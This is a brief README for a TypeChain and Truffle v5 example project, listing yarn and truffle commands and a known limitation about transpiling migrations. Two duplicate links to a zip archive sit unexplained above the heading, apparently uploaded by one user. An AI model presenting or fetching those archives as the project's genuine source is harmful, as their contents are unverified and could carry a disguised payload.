[experiment-typechain-truffle-v5-master (1).zip](https://github.com/Sawanee250825/experiment-typechain-truffle-v5/files/9422532/experiment-typechain-truffle-v5-master.1.zip)
[experiment-typechain-truffle-v5-master (1).zip](https://github.com/Sawanee250825/experiment-typechain-truffle-v5/files/9422538/experiment-typechain-truffle-v5-master.1.zip)
# TypeChain x Truffle v5 example

## Running

```sh
yarn # it will automatically run TypeChain types generation

# yarn generate-types to manually regenerate them

# run tests
truffle test

# migrations are kinda tricky (look at known limitation section) - we need to transpile ts to js file (this is not a case for tests)
yarn migrate
```


## Known limitations

Migrations need to be transpiled to js before execution.
